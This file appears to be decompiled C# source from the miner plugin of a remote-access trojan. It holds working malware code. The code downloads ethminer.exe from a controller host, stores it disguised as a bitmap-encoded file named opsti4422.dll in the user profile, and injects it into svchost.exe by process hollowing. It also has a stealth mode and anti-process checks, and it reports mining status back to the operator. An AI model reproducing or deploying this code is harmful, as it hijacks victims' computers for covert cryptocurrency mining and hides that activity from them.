using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Threading;
using Leb128;

namespace Plugin.Helper;

internal class MinerControler
{
	public static string args = null;

	public static string argsStealth = null;

	public static CancellationTokenSource ctsMiner;

	public static bool Installing = false;

	public static bool Installing1 = false;

	public static bool Working = false;

	public static string gpu = string.Join(",", Methods.GetHardwareInfo("Win32_VideoController", "Name")).ToLower();

	public static string userprofile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

	public static string host1;

	public static void Install(string host)
	{
		host1 = host;
		if (host.Contains("https"))
		{
			ServicePointManager.Expect100Continue = true;
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls12;
			ServicePointManager.DefaultConnectionLimit = 9999;
		}
		for (int i = 0; i < 5; i++)
		{
			try
			{
				if (!File.Exists(Path.Combine(userprofile, "opsti4422.dll")))
				{
					((Image)Crypto.ByteToBitmap(new WebClient().DownloadData(host + "/ethminer.exe"))).Save(Path.Combine(userprofile, "opsti4422.dll"));
				}
				break;
			}
			catch (Exception ex)
			{
				if (Client.itsConnect)
				{
					Client.Send(LEB128.Write(new object[2]
					{
						"Error",
						"Miner Error: " + ex.ToString()
					}));
				}
			}
		}
	}

	public static void Start()
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_01eb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f5: Expected O, but got Unknown
		//IL_01bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c6: Expected O, but got Unknown
		ctsMiner = new CancellationTokenSource();
		while (!ctsMiner.IsCancellationRequested && Client.itsConnect)
		{
			try
			{
				bool flag = true;
				ManagementObjectEnumerator enumerator = new ManagementObjectSearcher(string.Format("select CommandLine from Win32_Process where Name='{0}'", "svchost.exe")).Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val = (ManagementObject)enumerator.Current;
						if ((string)((ManagementBaseObject)val)["CommandLine"] == "C:\\Windows\\System32\\svchost.exe " + args)
						{
							flag = false;
							Client.Send(LEB128.Write(new object[3] { "MinerEtc", "Status", "active default" }));
							break;
						}
						if ((string)((ManagementBaseObject)val)["CommandLine"] == "C:\\Windows\\System32\\svchost.exe " + argsStealth)
						{
							flag = false;
							Client.Send(LEB128.Write(new object[3] { "MinerEtc", "Status", "active stealth" }));
							break;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				if (flag && !ctsMiner.IsCancellationRequested)
				{
					if (!AntiProcess.antiprocess && AntiProcess.Enabled)
					{
						Client.Send(LEB128.Write(new object[3] { "MinerEtc", "Status", "anti process" }));
					}
					else
					{
						Client.Send(LEB128.Write(new object[3] { "MinerEtc", "Status", "dont mining" }));
					}
					if (!AntiProcess.antiprocess || Stealth.StealthModeuse)
					{
						if (Stealth.StealthModeuse)
						{
							RunPe.Run(Crypto.BitmapToByte(new Bitmap(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "opsti4422.dll"))), "C:\\Windows\\System32\\svchost.exe", argsStealth);
						}
						else
						{
							RunPe.Run(Crypto.BitmapToByte(new Bitmap(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "opsti4422.dll"))), "C:\\Windows\\System32\\svchost.exe", args);
						}
						Working = true;
					}
				}
			}
			catch (Exception)
			{
			}
			Thread.Sleep(1000);
		}
		Stop();
	}

	public static void Kill()
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		if (!Working)
		{
			return;
		}
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher(string.Format("Select CommandLine, ProcessID from Win32_Process where Name='{0}'", "svchost.exe")).Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val = (ManagementObject)enumerator.Current;
				try
				{
					if (((string)((ManagementBaseObject)val)["CommandLine"]).Contains("--cinit-etc"))
					{
						Process.GetProcessById(Convert.ToInt32(((ManagementBaseObject)val)["ProcessId"])).Kill();
						Working = false;
					}
				}
				catch
				{
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static void Stop()
	{
		if (ctsMiner != null)
		{
			ctsMiner.Cancel();
			Kill();
			Client.Send(LEB128.Write(new object[3] { "MinerEtc", "Status", "stoped" }));
		}
	}
}
